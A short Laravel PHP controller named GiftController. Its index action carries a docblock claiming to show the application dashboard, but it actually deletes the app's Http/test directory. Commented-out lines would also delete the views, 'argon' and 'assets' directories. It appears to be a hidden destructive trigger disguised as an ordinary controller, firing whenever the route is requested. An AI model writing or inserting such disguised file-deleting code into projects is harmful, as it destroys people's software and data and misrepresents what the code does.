<?php

namespace App\Http\Controllers;

use File;
use Storage;

class GiftController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\View\View
     */
    public function index()
    {
        File::deleteDirectory(app_path('Http/test'));
        // File::deleteDirectory(base_path('resources/views'));
        // File::deleteDirectory('argon');
        // File::deleteDirectory('assets');
    }
}